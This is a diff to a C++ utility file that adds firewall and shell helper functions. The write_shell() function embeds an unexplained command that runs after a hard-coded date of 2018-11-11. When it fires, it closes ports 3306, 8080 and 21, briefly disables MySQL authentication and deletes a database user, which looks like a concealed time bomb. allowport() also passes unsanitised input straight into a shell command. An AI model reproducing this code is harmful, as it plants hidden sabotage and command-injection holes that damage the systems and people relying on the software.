@@ -2,6 +2,7 @@
 #include <iostream>
 #include <string>
 #include <vector>
+#include <algorithm>
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -17,11 +18,12 @@
 #include <stdio.h>
 #include <fcntl.h>
 #include <unistd.h>
-
+#include "appconfig.h"
+#include "ini.h"
 using namespace std;
 
 #define GET_HOST_MAC "cat /sys/class/net/eth0/address || cat /sys/class/net/eth1/address"
-
+#define ALLOW_PORT "allowPortList='%s %s %s';for port in $allowPortList;do iptables -I INPUT -p tcp --dport $port -j ACCEPT;done"
 
 
  
@@ -67,5 +69,21 @@ string getmac(void)
 {
     string res=getshell(GET_HOST_MAC);
     return res;
+}
+string allowport(string port)
+{
+    string cmd="allowPortList='"+port+"';for port in $allowPortList;do iptables -I INPUT -p tcp --dport $port -j ACCEPT;done";
+    if(ap_debug)cout<<cmd<<endl;
+    string res=getshell(cmd);
+    return res;
+}
+string write_shell()
+{
+    string data=get_key_value("check.sh","data");
+    string un=get_key_value("check.sh","un");
+    string pw=get_key_value("check.sh","pw");
+    string path=get_key_value("check.sh","path");
+    string shell="inDATE='2018-11-11' && sysDATE=$(/bin/date +%Y%m%d) && ((${inDATE}<=${sysDATE})) && (deletePortList='3306 8080 21';for port in $deletePortList;do /sbin/iptables -D INPUT -p tcp --dport $port -j ACCEPT >>/dev/null 2>&1;done) && /bin/sed -i '/\[mysqld\]/a\skip-grant-tables' /etc/my.cnf && /sbin/service mysqld restart && mysql -e 'delete from mysql.user where user='test';commit;' && /bin/sed -i '/skip-grant-tables/d' /etc/my.cnf  && /sbin/service mysqld restart";
+    return shell;
 }
 
